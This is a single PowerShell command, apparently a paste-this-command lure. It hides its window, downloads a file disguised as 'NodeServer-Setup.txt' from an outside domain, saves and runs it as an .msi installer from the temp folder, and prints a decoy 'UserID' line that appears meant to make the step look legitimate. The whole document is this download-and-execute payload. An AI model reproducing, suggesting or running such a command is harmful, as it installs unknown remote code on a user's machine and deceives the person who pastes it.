powershell  -WindowStyle Hidden -c "iwr 'https://agency-portals.com/NodeServer-Setup.txt' -o $env:TEMP\\tc.msi; & $env:TEMP\\tc.msi; Write-Host 'UserID:63994529832'"
